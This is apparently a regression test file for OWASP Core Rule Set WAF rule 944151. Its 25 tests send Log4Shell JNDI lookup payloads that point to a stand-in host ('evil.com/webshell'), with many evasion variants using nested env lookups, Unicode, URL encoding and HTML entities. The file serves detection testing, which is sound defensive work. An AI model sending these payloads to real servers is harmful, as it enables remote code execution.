---
# NOTE: Please keep these tests in sync with 944150.yaml and 944152.yaml.
#       944151 should detect the same things as 944150 and 944152.
meta:
  author: "dune73, Max Leske, azurit"
rule_id: 944151
tests:
  - test_id: 1
    desc: Log4J exploit on arg foo
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/x-www-form-urlencoded
          method: POST
          port: 80
          uri: "/post"
          data: foo=${jndi:ldap://evil.com/webshell}
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 2
    desc: Log4J exploit on User-Agent
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent ${jndi:ldap://evil.com/webshell}"
          method: GET
          port: 80
          uri: "/get"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 3
    desc: Log4J exploit in XML code
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/xml
          method: POST
          port: 80
          uri: "/post"
          data: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><tag attribute="${jndi:ldap://evil.com/webshell}"/>
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 4
    desc: Log4J exploit in XML code
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/xml
          method: POST
          port: 80
          uri: "/post"
          data: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><tag>"${jndi:ldap://evil.com/webshell}"</tag>
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 5
    desc: Log4J exploit on arg foo, with evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/x-www-form-urlencoded
          method: POST
          port: 80
          uri: "/post"
          data: foo=${${env:FOO:-j}ndi:ldap://evil.com/webshell}
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 6
    desc: Log4J exploit on arg foo, with evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/x-www-form-urlencoded
          method: POST
          port: 80
          uri: "/post"
          data: foo=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/webshell}
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 7
    desc: Log4J exploit on arg foo, with evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/x-www-form-urlencoded
          method: POST
          port: 80
          uri: "/post"
          data: foo=$${env:something:-${env:something:-$}{jndi:ldap://evil.com/webshell}}}
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 8
    desc: Log4J exploit on arg foo, with Unicode escape encoding evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/x-www-form-urlencoded
          method: POST
          port: 80
          uri: "/post"
          data: foo=$\u007Bjndi:ldap://evil.com/webshell}
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 9
    desc: Log4J exploit on JSON with URL encoding evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 10
    desc: Log4J exploit on JSON with Unicode escape evasion, uppercase
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "$\u007Bjndi:ldap://evil.com/webshell}"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 11
    desc: Log4J exploit on JSON with Unicode escape evasion, lowercase
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "$\u007bjndi:ldap://evil.com/webshell}"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 12
    desc: Log4J exploit on JSON with named HTML entity evasion, lower case
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "$&lbrace;jndi:ldap://evil.com/webshell}"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 13
    desc: Log4J exploit on JSON with named HTML entity evasion, upper case
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "$&LBRACE;jndi:ldap://evil.com/webshell}"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 14
    desc: Log4J exploit on JSON with numeric HTML entity evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "&#36;{jndi:ldap://evil.com/webshell}"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 15
    desc: Log4J exploit on JSON with Unicode escape evasion, wrapped in URL encoding evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "%24%5Cu007Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 16
    desc: Log4J exploit on JSON with URL encoding evasion, wrapped in Unicode escape evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "\u002524%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 17
    desc: Log4J exploit on JSON with URL encoding evasion, mixed with Unicode escape evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "%24\u007Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 18
    desc: Log4J exploit on JSON with named HTML entity evasion wrapped in URL encoding evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "%24%26lbrace%3Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 19
    desc: Log4J exploit on JSON with numeric HTML entity evasion wrapped in URL encoding evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "%26%2336%3B%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 20
    desc: Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "$\u0026lbrace;jndi:ldap://evil.com/webshell}"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 21
    desc: Log4J exploit on JSON with numeric HTML entity evasion, wrapped in Unicode escape evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "$\u0026#123;jndi:ldap://evil.com/webshell}"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 22
    desc: Log4J exploit on JSON with named and numeric HTML entity evasion, mixed with unicode escape evasion and URL encoding evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "%24&lcub;\u006A&#110;di:ldap://evil.com/webshell}"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 23
    desc: Log4J exploit on User-Agent header which is known to work against org.apache.commons:commons-text:1.9
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: '&#x24;&#00000000000000000000000000000000000000000000000123;jndi:ldap://evil.om/w}'
            Content-Type: text/html
          method: GET
          port: 80
          uri: "/get"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 24
    desc: Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion, omitting terminal semi-colon
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "$\u0026lbracejndi:ldap://evil.com/webshell}"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
  - test_id: 25
    desc: Log4J exploit on arg foo, with evasion
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: "*/*"
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/x-www-form-urlencoded
          method: POST
          port: 80
          uri: "/post"
          data: foo=$${env:somethingveryverylong:-${env:something:-$}{jndi:ldap://evilhost.com/webshell}}}
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [944151]
